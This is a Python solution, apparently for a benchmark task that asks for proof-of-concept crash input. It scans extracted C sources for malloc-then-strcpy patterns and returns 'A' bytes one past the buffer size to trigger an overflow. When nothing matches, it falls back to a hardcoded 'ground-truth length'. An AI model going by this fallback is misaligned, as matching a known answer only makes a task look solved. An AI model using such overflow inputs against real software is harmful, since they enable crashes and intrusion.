import os
import re
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to a temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r') as tar:
                tar.extractall(tmpdir)
            
            # Find all .c files
            c_files = []
            for root, dirs, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith('.c'):
                        c_files.append(os.path.join(root, file))
            
            # Search for the vulnerability pattern: malloc followed by strcpy
            min_size = None
            for c_file in c_files:
                with open(c_file, 'r', errors='ignore') as f:
                    content = f.read()
                    
                    # Remove comments to avoid false positives
                    # Simple removal of single-line comments
                    lines = content.split('\n')
                    cleaned_lines = []
                    for line in lines:
                        # Remove inline comments
                        idx = line.find('//')
                        if idx != -1:
                            line = line[:idx]
                        cleaned_lines.append(line)
                    cleaned_content = '\n'.join(cleaned_lines)
                    
                    # Find all malloc assignments with constant size
                    malloc_pattern = r'(\w+)\s*=\s*malloc\s*\(\s*(\d+)\s*\)'
                    malloc_matches = re.findall(malloc_pattern, cleaned_content)
                    
                    # For each malloc, look for strcpy using that variable
                    for var, size_str in malloc_matches:
                        size = int(size_str)
                        # Pattern for strcpy with the same variable as destination
                        strcpy_pattern = r'strcpy\s*\(\s*' + re.escape(var) + r'\s*,'
                        if re.search(strcpy_pattern, cleaned_content):
                            if min_size is None or size < min_size:
                                min_size = size
            
            # Generate PoC based on found size or default to ground-truth length
            if min_size is not None:
                # Overflow by one byte (including null terminator)
                poc_length = min_size + 1
            else:
                # Default to ground-truth length
                poc_length = 9
            
            # Ensure at least 1 byte
            if poc_length < 1:
                poc_length = 1
            
            # Create PoC with non-null bytes
            return b'A' * poc_length
